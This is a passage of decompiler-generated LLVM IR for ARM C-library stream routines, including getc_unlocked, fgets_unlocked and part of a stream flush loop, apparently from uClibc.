  %v1_eb08 = inttoptr i32 %v4_eafc to i32*
  %v2_eb08 = load i32, i32* %v1_eb08, align 4
  store i32 %v2_eb08, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_eab8)
  %v0_eb14 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_eb14, i32* @r6, align 4
  %v2_eb18 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_eb18, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_ebac.pr = load i32, i32* @r7, align 4
  %v2_ebac19 = icmp eq i32 %v0_ebac.pr, 0
  br i1 %v2_ebac19, label %dec_label_pc_ebb4, label %dec_label_pc_eb20

dec_label_pc_eb20:                                ; preds = %dec_label_pc_ea54, %dec_label_pc_eba8
  %v0_eb2c = phi i32 [ %v3_eba8, %dec_label_pc_eba8 ], [ %v0_ebac.pr, %dec_label_pc_ea54 ]
  %v1_eb20 = inttoptr i32 %v0_eb2c to i16*
  %v2_eb20 = load i16, i16* %v1_eb20, align 2
  %v3_eb20 = zext i16 %v2_eb20 to i32
  store i32 %v3_eb20, i32* %r3.global-to-local, align 4
  %v1_eb24 = and i32 %v3_eb20, 64
  %v2_eb24 = icmp eq i32 %v1_eb24, 0
  br i1 %v2_eb24, label %dec_label_pc_eba8, label %dec_label_pc_eb2c

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_eb20
  %v1_eb2c = add i32 %v0_eb2c, 56
  store i32 %v1_eb2c, i32* @r4, align 4
  store i32 %v1_eb2c, i32* %r2.global-to-local, align 4
  %v0_eb3c = load i32, i32* %sb.global-to-local, align 4
  %v1_eb3c = load i32, i32* %fp.global-to-local, align 4
  %v2_eb3c = add i32 %v1_eb3c, %v0_eb3c
  %v3_eb3c = inttoptr i32 %v2_eb3c to i32*
  %v4_eb3c = load i32, i32* %v3_eb3c, align 4
  call void @__pseudo_branch(i32 %v4_eb3c)
  %v1_eb4c = load i32, i32* @r8, align 4
  %v2_eb4c = add i32 %v1_eb4c, %v0_eb3c
  %v3_eb4c = inttoptr i32 %v2_eb4c to i32*
  %v4_eb4c = load i32, i32* %v3_eb4c, align 4
  call void @__pseudo_branch(i32 %v4_eb4c)
  %v0_eb58 = load i32, i32* @r7, align 4
  %v1_eb58 = inttoptr i32 %v0_eb58 to i16*
  %v2_eb58 = load i16, i16* %v1_eb58, align 2
  %v3_eb58 = zext i16 %v2_eb58 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_eb60 = or i32 %v3_eb58, %stack_var_-60.1.in
  %v1_eb64 = xor i32 %v2_eb60, 320
  store i32 %v1_eb64, i32* %r3.global-to-local, align 4
  %v1_eb68 = and i32 %v1_eb64, 832
  %v2_eb68 = icmp eq i32 %v1_eb68, 0
  br i1 %v2_eb68, label %dec_label_pc_eb70, label %bb38

dec_label_pc_eb70:                                ; preds = %dec_label_pc_eb2c
  store i32 %v0_eb58, i32* @r0, align 4
  %v0_eb74 = call i32 @__stdio_wcommit()
  %v2_eb78 = icmp eq i32 %v0_eb74, 0
  br i1 %v2_eb78, label %.thread7, label %.thread8

.thread7:                                         ; preds = %dec_label_pc_eb70
  %v1_eb7c = load i32, i32* @r7, align 4
  %v2_eb7c = inttoptr i32 %v1_eb7c to i16*
  %v3_eb7c = load i16, i16* %v2_eb7c, align 2
  %v4_eb7c = zext i16 %v3_eb7c to i32
  store i32 %v4_eb7c, i32* %r3.global-to-local, align 4
  %v2_eb80 = add i32 %v1_eb7c, 8
  %v3_eb80 = inttoptr i32 %v2_eb80 to i32*
  %v4_eb80 = load i32, i32* %v3_eb80, align 4
  store i32 %v4_eb80, i32* %r2.global-to-local, align 4
  %v2_eb84 = and i32 %v4_eb7c, 65471
  store i32 %v2_eb84, i32* %r3.global-to-local, align 4
  %v3_eb88 = add i32 %v1_eb7c, 28
  %v4_eb88 = inttoptr i32 %v3_eb88 to i32*
  store i32 %v4_eb80, i32* %v4_eb88, align 4
  %v1_eb8c = load i32, i32* %r3.global-to-local, align 4
  %v2_eb8c = trunc i32 %v1_eb8c to i16
  %v3_eb8c = load i32, i32* @r7, align 4
  %v4_eb8c = inttoptr i32 %v3_eb8c to i16*
  store i16 %v2_eb8c, i16* %v4_eb8c, align 2
  br label %bb38

.thread8:                                         ; preds = %dec_label_pc_eb70
  store i32 -1, i32* @r6, align 4
  br label %bb38

bb38:                                             ; preds = %.thread7, %dec_label_pc_eb2c, %.thread8
  %v0_eb9c = load i32, i32* %sb.global-to-local, align 4
  %v1_eb9c = load i32, i32* %sl.global-to-local, align 4
  %v2_eb9c = add i32 %v1_eb9c, %v0_eb9c
  %v3_eb9c = inttoptr i32 %v2_eb9c to i32*
  %v4_eb9c = load i32, i32* %v3_eb9c, align 4
  call void @__pseudo_branch(i32 %v4_eb9c)
  %v0_eba8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_eba8

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eb20, %bb38
  %v0_eba8 = phi i32 [ %v0_eb2c, %dec_label_pc_eb20 ], [ %v0_eba8.pre, %bb38 ]
  %v1_eba8 = add i32 %v0_eba8, 32
  %v2_eba8 = inttoptr i32 %v1_eba8 to i32*
  %v3_eba8 = load i32, i32* %v2_eba8, align 4
  store i32 %v3_eba8, i32* @r7, align 4
  %v2_ebac = icmp eq i32 %v3_eba8, 0
  br i1 %v2_ebac, label %dec_label_pc_ebb4, label %dec_label_pc_eb20

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eba8, %dec_label_pc_ea54
  %v0_ebb4 = call i32 @_stdio_openlist_dec_use()
  %v0_ebf0.pre = load i32, i32* @r6, align 4
  br label %bb40

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_ea44
  %v2_ebbc = load i16, i16* %arg1, align 2
  %v3_ebbc = zext i16 %v2_ebbc to i32
  %v1_ebc0 = and i32 %v3_ebbc, 64
  store i32 %v1_ebc0, i32* %r3.global-to-local, align 4
  %v2_ebc0 = icmp eq i32 %v1_ebc0, 0
  br i1 %v2_ebc0, label %bb39, label %dec_label_pc_ebcc

bb39:                                             ; preds = %dec_label_pc_ebbc
  br label %bb40

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_ebbc
  %v0_ebcc = call i32 @__stdio_wcommit()
  %v2_ebd0 = icmp eq i32 %v0_ebcc, 0
  br i1 %v2_ebd0, label %.thread15, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_ebcc
  br label %bb40

.thread15:                                        ; preds = %dec_label_pc_ebcc
  %v1_ebd4 = load i32, i32* %fp.global-to-local, align 4
  %v2_ebd4 = inttoptr i32 %v1_ebd4 to i16*
  %v3_ebd4 = load i16, i16* %v2_ebd4, align 2
  %v4_ebd4 = zext i16 %v3_ebd4 to i32
  store i32 %v4_ebd4, i32* %r3.global-to-local, align 4
  %v2_ebd8 = add i32 %v1_ebd4, 8
  %v3_ebd8 = inttoptr i32 %v2_ebd8 to i32*
  %v4_ebd8 = load i32, i32* %v3_ebd8, align 4
  store i32 %v4_ebd8, i32* %r2.global-to-local, align 4
  %v2_ebdc = and i32 %v4_ebd4, 65471
  store i32 %v2_ebdc, i32* %r3.global-to-local, align 4
  %v2_ebe0 = trunc i32 %v2_ebdc to i16
  store i16 %v2_ebe0, i16* %v2_ebd4, align 2
  %v1_ebe4 = load i32, i32* %r2.global-to-local, align 4
  %v2_ebe4 = load i32, i32* %fp.global-to-local, align 4
  %v3_ebe4 = add i32 %v2_ebe4, 28
  %v4_ebe4 = inttoptr i32 %v3_ebe4 to i32*
  store i32 %v1_ebe4, i32* %v4_ebe4, align 4
  br label %bb40

bb40:                                             ; preds = %bb39, %.thread17, %dec_label_pc_ebb4, %.thread15
  %v0_ebf0 = phi i32 [ -1, %.thread17 ], [ 0, %bb39 ], [ %v0_ebf0.pre, %dec_label_pc_ebb4 ], [ 0, %.thread15 ]
  ret i32 %v0_ebf0

; uselistorder directives
  uselistorder i32 %v3_eba8, { 1, 2, 0 }
  uselistorder i32 %v0_ea98, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 112) to i32*), { 1, 2, 0 }
  uselistorder label %bb40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_eba8, { 1, 0 }
  uselistorder label %bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eb20, { 1, 0 }
  uselistorder label %dec_label_pc_ea54, { 1, 0 }
}

define i32 @function_ec04(i32 %arg1) local_unnamed_addr {
dec_label_pc_ec04:
  %v0_ec04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ec04, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_ec04
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_ec04, %bb
  %v5_ec20 = phi i32 [ %arg1, %dec_label_pc_ec04 ], [ 0, %bb ]
  ret i32 %v5_ec20

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_ec24 = load i32, i32* @r4, align 4
  store i32 %v3_ec24, i32* %stack_var_-12, align 4
  %v6_ec24 = load i32, i32* @r5, align 4
  %v9_ec24 = load i32, i32* @lr, align 4
  %v0_ec28 = load i32, i32* @r0, align 4
  %v1_ec28 = add i32 %v0_ec28, 16
  %v2_ec28 = inttoptr i32 %v1_ec28 to i32*
  %v3_ec28 = load i32, i32* %v2_ec28, align 4
  store i32 %v3_ec28, i32* %r2.global-to-local, align 4
  %v1_ec2c = add i32 %v0_ec28, 24
  %v2_ec2c = inttoptr i32 %v1_ec2c to i32*
  %v3_ec2c = load i32, i32* %v2_ec2c, align 4
  %v3_ec30 = icmp ult i32 %v3_ec28, %v3_ec2c
  store i32 %v0_ec28, i32* @r4, align 4
  br i1 %v3_ec30, label %bb, label %dec_label_pc_ec50

bb:                                               ; preds = %entry
  %v2_ec3c = inttoptr i32 %v3_ec28 to i8*
  %v3_ec3c = load i8, i8* %v2_ec3c, align 1
  %v4_ec3c = zext i8 %v3_ec3c to i32
  store i32 %v4_ec3c, i32* %r0.global-to-local, align 4
  %v6_ec3c = add i32 %v3_ec28, 1
  store i32 %v6_ec3c, i32* %r2.global-to-local, align 4
  store i32 %v6_ec3c, i32* %v2_ec28, align 4
  br label %dec_label_pc_ed3c

dec_label_pc_ec50:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  %v1_ec50 = inttoptr i32 %v0_ec28 to i16*
  %v2_ec50 = load i16, i16* %v1_ec50, align 2
  %v3_ec50 = zext i16 %v2_ec50 to i32
  %v1_ec54 = and i32 %v3_ec50, 131
  %tmp25 = icmp ugt i32 %v1_ec54, 128
  br i1 %tmp25, label %dec_label_pc_ec70, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec50
  store i32 128, i32* @r1, align 4
  %v0_ec64 = call i32 @__stdio_trans2r_o()
  store i32 %v0_ec64, i32* %r0.global-to-local, align 4
  %v2_ec68 = icmp eq i32 %v0_ec64, 0
  br i1 %v2_ec68, label %dec_label_pc_ec60.dec_label_pc_ec70_crit_edge, label %dec_label_pc_ed38

dec_label_pc_ec60.dec_label_pc_ec70_crit_edge:    ; preds = %dec_label_pc_ec60
  %v0_ec70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ec70

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ec60.dec_label_pc_ec70_crit_edge, %dec_label_pc_ec50
  %v2_ecb0 = phi i32 [ %v0_ec70.pre, %dec_label_pc_ec60.dec_label_pc_ec70_crit_edge ], [ %v0_ec28, %dec_label_pc_ec50 ]
  %v1_ec70 = inttoptr i32 %v2_ecb0 to i16*
  %v2_ec70 = load i16, i16* %v1_ec70, align 2
  %v3_ec70 = zext i16 %v2_ec70 to i32
  store i32 %v3_ec70, i32* %r2.global-to-local, align 4
  %v1_ec74 = and i32 %v3_ec70, 2
  %v2_ec74 = icmp eq i32 %v1_ec74, 0
  br i1 %v2_ec74, label %dec_label_pc_eca0, label %dec_label_pc_ec7c

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec70
  %tmp26 = urem i16 %v2_ec70, 2
  %v1_ec7c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_ec7c
  %v4_ec80 = and i32 %tmp22, 4
  %v5_ec80 = add i32 %v4_ec80, %v2_ecb0
  %v1_ec84 = add i32 %v5_ec80, 36
  %v2_ec84 = inttoptr i32 %v1_ec84 to i8*
  %v3_ec84 = load i8, i8* %v2_ec84, align 1
  %v4_ec84 = zext i8 %v3_ec84 to i32
  %v1_ec88 = add nsw i32 %v3_ec70, -1
  store i32 %v1_ec88, i32* %r2.global-to-local, align 4
  store i32 %v4_ec84, i32* %r0.global-to-local, align 4
  %v2_ec94 = add i32 %v2_ecb0, 40
  %v3_ec94 = inttoptr i32 %v2_ec94 to i32*
  store i32 0, i32* %v3_ec94, align 4
  %v0_ec98 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec98 = trunc i32 %v0_ec98 to i16
  %v2_ec98 = load i32, i32* @r4, align 4
  %v3_ec98 = inttoptr i32 %v2_ec98 to i16*
  store i16 %v1_ec98, i16* %v3_ec98, align 2
  br label %dec_label_pc_ed3c

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec70
  %v1_eca0 = add i32 %v2_ecb0, 16
  %v1_eca4 = inttoptr i32 %v1_eca0 to i32*
  %v2_eca4 = load i32, i32* %v1_eca4, align 4
  %v3_eca4 = add i32 %v2_ecb0, 20
  %v4_eca4 = inttoptr i32 %v3_eca4 to i32*
  %v5_eca4 = load i32, i32* %v4_eca4, align 4
  %v9_eca8 = icmp eq i32 %v5_eca4, %v2_eca4
  br i1 %v9_eca8, label %dec_label_pc_ecb8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_eca0
  %v2_ecac = inttoptr i32 %v2_eca4 to i8*
  %v3_ecac = load i8, i8* %v2_ecac, align 1
  %v4_ecac = zext i8 %v3_ecac to i32
  store i32 %v4_ecac, i32* %r0.global-to-local, align 4
  %v6_ecac = add i32 %v2_eca4, 1
  store i32 %v6_ecac, i32* %v1_eca4, align 4
  br label %dec_label_pc_ed3c

dec_label_pc_ecb8:                                ; preds = %dec_label_pc_eca0
  %v1_ecb8 = add i32 %v2_ecb0, 4
  %v2_ecb8 = inttoptr i32 %v1_ecb8 to i32*
  %v3_ecb8 = load i32, i32* %v2_ecb8, align 4
  %v7_ecbc = icmp eq i32 %v3_ecb8, -2
  br i1 %v7_ecbc, label %.thread7, label %dec_label_pc_ecd0

.thread7:                                         ; preds = %dec_label_pc_ecb8
  %v2_ecc0 = or i16 %v2_ec70, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_ecc0, i16* %v1_ec70, align 2
  br label %dec_label_pc_ed3c

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ecb8
  %v1_ecd0 = and i32 %v3_ec70, 768
  %v2_ecd0 = icmp eq i32 %v1_ecd0, 0
  br i1 %v2_ecd0, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_ecd0
  %v1_ecd8 = load i32, i32* @r5, align 4
  %v3_ecd8 = add i32 %v1_ecd8, 48
  %v4_ecd8 = inttoptr i32 %v3_ecd8 to i32*
  %v5_ecd8 = load i32, i32* %v4_ecd8, align 4
  store i32 %v5_ecd8, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_ecd0, %bb23
  %v1_ecdc = xor i1 %v2_ecd0, true
  call void @__pseudo_cond_branch(i1 %v1_ecdc, i32 ptrtoint (i32* @global_var_ea18.244 to i32))
  %v0_ece0 = load i32, i32* @r4, align 4
  %v1_ece0 = add i32 %v0_ece0, 8
  store i32 %v1_ece0, i32* %r2.global-to-local, align 4
  %v1_ece4 = inttoptr i32 %v1_ece0 to i32*
  %v2_ece4 = load i32, i32* %v1_ece4, align 4
  store i32 %v2_ece4, i32* %r2.global-to-local, align 4
  %v3_ece4 = add i32 %v0_ece0, 12
  %v4_ece4 = inttoptr i32 %v3_ece4 to i32*
  %v5_ece4 = load i32, i32* %v4_ece4, align 4
  %v9_ece8 = icmp eq i32 %v5_ece4, %v2_ece4
  br i1 %v9_ece8, label %dec_label_pc_ed1c, label %dec_label_pc_ecf0

dec_label_pc_ecf0:                                ; preds = %.thread9
  %v2_ecf0 = add i32 %v0_ece0, 24
  %v3_ecf0 = inttoptr i32 %v2_ecf0 to i32*
  store i32 %v2_ece4, i32* %v3_ecf0, align 4
  %v0_ecf4 = load i32, i32* @r4, align 4
  store i32 %v0_ecf4, i32* %r0.global-to-local, align 4
  %v2_ecf8 = call i32 @__stdio_rfill(i32 %v0_ecf4)
  store i32 %v2_ecf8, i32* %r0.global-to-local, align 4
  %v2_ecfc = icmp eq i32 %v2_ecf8, 0
  br i1 %v2_ecfc, label %dec_label_pc_ed38, label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ecf0
  %v0_ed04 = load i32, i32* @r4, align 4
  %v1_ed04 = add i32 %v0_ed04, 20
  %v2_ed04 = inttoptr i32 %v1_ed04 to i32*
  %v3_ed04 = load i32, i32* %v2_ed04, align 4
  %v2_ed08 = add i32 %v0_ed04, 24
  %v3_ed08 = inttoptr i32 %v2_ed08 to i32*
  store i32 %v3_ed04, i32* %v3_ed08, align 4
  %v0_ed0c = load i32, i32* @r4, align 4
  %v1_ed0c = add i32 %v0_ed0c, 16
  %v2_ed0c = inttoptr i32 %v1_ed0c to i32*
  %v3_ed0c = load i32, i32* %v2_ed0c, align 4
  %v1_ed10 = inttoptr i32 %v3_ed0c to i8*
  %v2_ed10 = load i8, i8* %v1_ed10, align 1
  %v3_ed10 = zext i8 %v2_ed10 to i32
  store i32 %v3_ed10, i32* %r0.global-to-local, align 4
  %v5_ed10 = add i32 %v3_ed0c, 1
  store i32 %v5_ed10, i32* %v2_ed0c, align 4
  br label %dec_label_pc_ed3c

dec_label_pc_ed1c:                                ; preds = %.thread9
  %v1_ed1c = inttoptr i32 %v0_ece0 to i16*
  store i32 %v0_ece0, i32* %r0.global-to-local, align 4
  %v2_ed20 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_ed28 = call i32 @__stdio_READ(i16* %v1_ed1c, i32 %v2_ed20, i32 1)
  store i32 %v5_ed28, i32* %r0.global-to-local, align 4
  %v2_ed2c = icmp eq i32 %v5_ed28, 0
  br i1 %v2_ed2c, label %dec_label_pc_ed38, label %bb24

bb24:                                             ; preds = %dec_label_pc_ed1c
  %v4_ed30 = load i8, i8* %stack_var_-17, align 1
  %v5_ed30 = sext i8 %v4_ed30 to i32
  store i32 %v5_ed30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed3c

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed1c, %dec_label_pc_ec60, %dec_label_pc_ecf0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed3c

dec_label_pc_ed3c:                                ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_ed04, %dec_label_pc_ec7c, %dec_label_pc_ed38
  %v2_ed40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ed40, i32* @r4, align 4
  store i32 %v6_ec24, i32* @r5, align 4
  store i32 %v9_ec24, i32* @lr, align 4
  %v1_ed44 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_ed44

; uselistorder directives
  uselistorder i32 %v2_eca4, { 1, 0, 2 }
  uselistorder i32 %v2_ecb0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_ec28, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_ed3c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_ed38, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_ed50 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed54 = icmp eq i32 %arg2, 0
  store i1 %v2_ed54, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_eddc, label %dec_label_pc_edc4.preheader

dec_label_pc_edc4.preheader:                      ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_edc42 = add i32 %arg2, -1
  store i32 %v1_edc42, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_edc48 = icmp eq i32 %arg2, 1
  store i1 %v7_edc48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edc48, label %dec_label_pc_edcc, label %dec_label_pc_ed70

dec_label_pc_ed70:                                ; preds = %dec_label_pc_edc4.preheader, %dec_label_pc_edc4.backedge.dec_label_pc_ed70_crit_edge
  %v0_ed94 = phi i32 [ %v0_ed70.pre, %dec_label_pc_edc4.backedge.dec_label_pc_ed70_crit_edge ], [ %arg3, %dec_label_pc_edc4.preheader ]
  %v1_ed70 = add i32 %v0_ed94, 16
  %v2_ed70 = inttoptr i32 %v1_ed70 to i32*
  %v3_ed70 = load i32, i32* %v2_ed70, align 4
  store i32 %v3_ed70, i32* %r2.global-to-local, align 4
  %v1_ed74 = add i32 %v0_ed94, 24
  %v2_ed74 = inttoptr i32 %v1_ed74 to i32*
  %v3_ed74 = load i32, i32* %v2_ed74, align 4
  store i32 %v3_ed74, i32* %r3.global-to-local, align 4
  %v3_ed78 = icmp uge i32 %v3_ed70, %v3_ed74
  store i1 %v3_ed78, i1* %cpsr_c.global-to-local, align 1
  %v9_ed78 = icmp eq i32 %v3_ed70, %v3_ed74
  store i1 %v9_ed78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ed78, label %dec_label_pc_ed94, label %dec_label_pc_ed80

dec_label_pc_ed80:                                ; preds = %dec_label_pc_ed70
  %v1_ed80 = inttoptr i32 %v3_ed70 to i8*
  %v2_ed80 = load i8, i8* %v1_ed80, align 1
  %v3_ed80 = zext i8 %v2_ed80 to i32
  store i32 %v3_ed80, i32* %r3.global-to-local, align 4
  %v5_ed80 = add i32 %v3_ed70, 1
  store i32 %v5_ed80, i32* %r2.global-to-local, align 4
  %v2_ed84 = load i32, i32* @r5, align 4
  %v3_ed84 = inttoptr i32 %v2_ed84 to i8*
  store i8 %v2_ed80, i8* %v3_ed84, align 1
  %v4_ed84 = load i32, i32* @r5, align 4
  %v5_ed84 = add i32 %v4_ed84, 1
  store i32 %v5_ed84, i32* @r5, align 4
  %v0_ed88 = load i32, i32* %r3.global-to-local, align 4
  %v2_ed88 = icmp ugt i32 %v0_ed88, 9
  store i1 %v2_ed88, i1* %cpsr_c.global-to-local, align 1
  %v7_ed88 = icmp eq i32 %v0_ed88, 10
  store i1 %v7_ed88, i1* %cpsr_z.global-to-local, align 1
  %v0_ed8c = load i32, i32* %r2.global-to-local, align 4
  %v1_ed8c = load i32, i32* @r4, align 4
  %v2_ed8c = add i32 %v1_ed8c, 16
  %v3_ed8c = inttoptr i32 %v2_ed8c to i32*
  store i32 %v0_ed8c, i32* %v3_ed8c, align 4
  br i1 %v7_ed88, label %dec_label_pc_edcc, label %dec_label_pc_edc4.backedge

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ed70
  %v1_ed94 = inttoptr i32 %v0_ed94 to i16*
  %v3_ed98 = call i32 @getc_unlocked(i16* %v1_ed94)
  %v3_ed9c = icmp eq i32 %v3_ed98, -1
  store i1 %v3_ed9c, i1* %cpsr_c.global-to-local, align 1
  %v8_ed9c = icmp eq i32 %v3_ed98, -1
  store i1 %v8_ed9c, i1* %cpsr_z.global-to-local, align 1
  %v1_eda0 = urem i32 %v3_ed98, 256
  store i32 %v1_eda0, i32* %r3.global-to-local, align 4
  br i1 %v3_ed9c, label %dec_label_pc_eda8, label %dec_label_pc_edc0

dec_label_pc_eda8:                                ; preds = %dec_label_pc_ed94
  %v0_eda8 = load i32, i32* @r4, align 4
  %v1_eda8 = inttoptr i32 %v0_eda8 to i16*
  %v2_eda8 = load i16, i16* %v1_eda8, align 2
  %v3_eda8 = zext i16 %v2_eda8 to i32
  store i32 %v3_eda8, i32* %r3.global-to-local, align 4
  %v1_edac = and i32 %v3_eda8, 8
  %v2_edac = icmp eq i32 %v1_edac, 0
  store i1 %v2_edac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edac, label %dec_label_pc_edcc, label %dec_label_pc_eddc

dec_label_pc_edc0:                                ; preds = %dec_label_pc_ed94
  %v1_edb8 = trunc i32 %v3_ed98 to i8
  %v2_edb8 = load i32, i32* @r5, align 4
  %v3_edb8 = inttoptr i32 %v2_edb8 to i8*
  store i8 %v1_edb8, i8* %v3_edb8, align 1
  %v4_edb8 = load i32, i32* @r5, align 4
  %v5_edb8 = add i32 %v4_edb8, 1
  store i32 %v5_edb8, i32* @r5, align 4
  %v0_edbc = load i32, i32* %r3.global-to-local, align 4
  %v2_edbc = icmp ugt i32 %v0_edbc, 9
  store i1 %v2_edbc, i1* %cpsr_c.global-to-local, align 1
  %v7_edbc = icmp eq i32 %v0_edbc, 10
  store i1 %v7_edbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edbc, label %dec_label_pc_edcc, label %dec_label_pc_edc4.backedge

dec_label_pc_edc4.backedge:                       ; preds = %dec_label_pc_edc0, %dec_label_pc_ed80
  %v0_edc4 = load i32, i32* %r6.global-to-local, align 4
  %v1_edc4 = add i32 %v0_edc4, -1
  store i32 %v1_edc4, i32* %r6.global-to-local, align 4
  %v2_edc4 = icmp ne i32 %v0_edc4, 0
  store i1 %v2_edc4, i1* %cpsr_c.global-to-local, align 1
  %v7_edc4 = icmp eq i32 %v0_edc4, 1
  store i1 %v7_edc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edc4, label %dec_label_pc_edcc, label %dec_label_pc_edc4.backedge.dec_label_pc_ed70_crit_edge

dec_label_pc_edc4.backedge.dec_label_pc_ed70_crit_edge: ; preds = %dec_label_pc_edc4.backedge
  %v0_ed70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ed70

dec_label_pc_edcc:                                ; preds = %dec_label_pc_edc0, %dec_label_pc_edc4.backedge, %dec_label_pc_ed80, %dec_label_pc_edc4.preheader, %dec_label_pc_eda8
  %v0_edcc = load i32, i32* @r5, align 4
  %v1_edcc = load i32, i32* @r7, align 4
  %v3_edcc = icmp uge i32 %v0_edcc, %v1_edcc
  store i1 %v3_edcc, i1* %cpsr_c.global-to-local, align 1
  %v9_edcc = icmp eq i32 %v0_edcc, %v1_edcc
  store i1 %v9_edcc, i1* %cpsr_z.global-to-local, align 1
  %v2_edd0 = xor i1 %v9_edcc, true
  %v3_edd0 = and i1 %v3_edcc, %v2_edd0
  br i1 %v3_edd0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_edcc
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_edd4 = inttoptr i32 %v0_edcc to i8*
  store i8 0, i8* %v7_edd4, align 1
  %v0_edd8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_edd8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_edcc, %bb
  %v1_edd8 = phi i1 [ %v1_edd8.pre, %bb ], [ %v9_edcc, %dec_label_pc_edcc ]
  %v0_edd8 = phi i1 [ %v0_edd8.pre, %bb ], [ %v3_edcc, %dec_label_pc_edcc ]
  %v2_edd8 = xor i1 %v1_edd8, true
  %v3_edd8 = and i1 %v0_edd8, %v2_edd8
  br i1 %v3_edd8, label %.dec_label_pc_ede0_crit_edge, label %dec_label_pc_eddc

.dec_label_pc_ede0_crit_edge:                     ; preds = %.thread14
  %v0_ede0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ede0

dec_label_pc_eddc:                                ; preds = %entry, %dec_label_pc_eda8, %.thread14
  br label %dec_label_pc_ede0

dec_label_pc_ede0:                                ; preds = %.dec_label_pc_ede0_crit_edge, %dec_label_pc_eddc
  %v0_ede0 = phi i32 [ %v0_ede0.pre, %.dec_label_pc_ede0_crit_edge ], [ 0, %dec_label_pc_eddc ]
  store i32 %v6_ed50, i32* @r5, align 4
  ret i32 %v0_ede0

; uselistorder directives
  uselistorder i1 %v9_edcc, { 1, 0, 2 }
  uselistorder i32 %v1_edcc, { 1, 0 }
  uselistorder i32 %v0_edcc, { 0, 2, 1 }
  uselistorder i32 %v0_edc4, { 2, 0, 1 }
